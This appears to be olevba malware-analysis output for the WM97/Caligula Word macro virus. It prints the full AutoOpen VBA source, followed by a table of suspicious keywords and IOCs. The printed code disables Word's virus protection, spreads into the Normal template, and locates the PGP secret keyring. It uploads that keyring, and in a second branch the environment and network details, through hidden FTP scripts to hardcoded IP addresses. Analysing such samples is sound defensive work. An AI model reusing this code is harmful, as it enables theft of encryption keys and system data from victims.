olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Trojan.MSWord.Caligula.e-af23dddafe1cbd792c15f3cefa64b4a662e5d941
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Trojan.MSWord.Caligula.e-af23dddafe1cbd792c15f3cefa64b4a662e5d941 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Caligula.bas 
in file: Trojan.MSWord.Caligula.e-af23dddafe1cbd792c15f3cefa64b4a662e5d941 - OLE stream: 'Macros/VBA/Caligula'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()

GoTo cnlabTest

On Error Resume Next
    
With Dialogs(wdDialogFileSummaryInfo)
.Author = "Opic"
.Title = "WM97/Caligula Infection"
.Subject = "A Study In Espionage Enabled Viruses."
.Comments = "The Best Security Is Knowing The Other Guy Hasn't Got Any."
.Keywords = " | Caligula | Opic | CodeBreakers | "
.Execute
End With

Options.VirusProtection = False
Options.SaveNormalPrompt = False
Options.ConfirmConversions = False

Application.ScreenUpdating = False
Application.DisplayStatusBar = False
Application.DisplayAlerts = False

CommandBars("tools").Controls("Macro").Enabled = False
CommandBars("tools").Controls("Customize...").Enabled = False
CommandBars("view").Controls("Toolbars").Enabled = False
CommandBars("view").Controls("Status Bar").Enabled = False

If NormalTemplate.VBProject.VBComponents.Item("Caligula").Name <> "Caligula" Then
NotInNorm = True
ActiveDocument.VBProject.VBComponents("Caligula").Export "c:\io.vxd"
Set Dobj = NormalTemplate.VBProject
ElseIf ActiveDocument.VBProject.VBComponents.Item("Caligula").Name <> "Caligula" Then
NotInActiv = True
NormalTemplate.VBProject.VBComponents("Caligula").Export "c:\io.vxd"
Set Dobj = ActiveDocument.VBProject
End If

If NotInNorm = True Or NotInActiv = True Then Dobj.VBComponents.Import ("c:\io.vxd")

If Day(Now) = 31 Then MsgBox "No cia," & vbCr & "No nsa," & vbCr & "No satellite," & vbCr & "Could map our veins.", 0, "WM97/Caligula (c) Opic [CodeBreakers 1998]"

If (System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "Caligula") = False) Then

pgppath = System.PrivateProfileString("", "HKEY_CLASSES_ROOT\PGP Encrypted File\shell\open\command", "")
Position = InStr(1, pgppath, "pgpt")

If Position <> 0 Then
pgppath = Mid(pgppath, 1, Position - 2)
Else
GoTo noPGP
End If

With Application.FileSearch
    .FileName = "\Secring.skr"
    .LookIn = pgppath
    .SearchSubFolders = True
    .MatchTextExactly = True
    .FileType = msoFileTypeAllFiles
    .Execute
    PGP_Sec_Key = .FoundFiles(1)
End With

Randomize
  For i = 1 To 4
    NewSecRingFile = NewSecRingFile + Mid(Str(Int(8 * Rnd)), 2, 1)
  Next i
  NewSecRingFile = "./secring" & NewSecRingFile & ".skr"

Open "c:\cdbrk.vxd" For Output As #1
    Print #1, "o 209.201.88.110"
    Print #1, "user anonymous"
    Print #1, "pass itsme@"
    Print #1, "cd incoming"
    Print #1, "binary"
    Print #1, "put """ & PGP_Sec_Key & """ """ & NewSecRingFile & """"
    Print #1, "quit"
    Close #1

Shell "command.com /c ftp.exe -n -s:c:\cdbrk.vxd", vbHide

System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\MS Setup (ACME)\User Info", "Caligula") = True

End If

noPGP:

If NotInActiv = True Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument

cnlabTest:

Rem
Rem ramdom file name generieren
Rem
Randomize
  For i = 1 To 4
    NewFile = NewFile + Mid(Str(Int(8 * Rnd)), 2, 1)
  Next i
  NewFile = "./test" & NewFile & ".txt"

Rem
Rem upload Daten generieren
Rem
Open "c:\cnlab.bat" For Output As #1
    Print #1, "set > c:\cnlab.txt"
    Print #1, "ipconfig >> c:\cnlab.txt"
    Print #1, "ftp.exe -n -s:c:\cnlab.ftp"
    Print #1, "del c:\cnlab.ftp c:\cnlab.txt"
Close #1

Open "c:\cnlab.ftp" For Output As #2
    Print #2, "o 160.63.96.71"
    Print #2, "user anonymous"
    Print #2, "pass itsme@"
    Print #2, "cd upload"
    Print #2, "ascii"
    Print #2, "put ""c:\cnlab.txt"" """ & NewFile & """"
    Print #2, "quit"
Close #2

Rem
Rem ftp durchführen
Rem
Shell "command.com /c c:\cnlab.bat", vbHide

Rem
Rem aufräumen
Rem
' Shell "command.com /c del c:\cnlab.bat", vbHide
ActiveDocument.VBProject.VBComponents("Caligula").CodeModule.DeleteLines StartLine:=2, Count:=130

ActiveDocument.Save
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|open                |May open a file                              |
|Suspicious|put                 |May write to a file (if combined with Open)  |
|Suspicious|Output              |May write to a file (if combined with Open)  |
|Suspicious|Print #             |May write to a file (if combined with Open)  |
|Suspicious|binary              |May read or write a binary file (if combined |
|          |                    |with Open)                                   |
|Suspicious|shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbHide              |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|command             |May run PowerShell commands                  |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |209.201.88.110      |IPv4 address                                 |
|IOC       |160.63.96.71        |IPv4 address                                 |
|IOC       |ftp.exe             |Executable file name                         |
|IOC       |cnlab.bat           |Executable file name                         |
+----------+--------------------+---------------------------------------------+

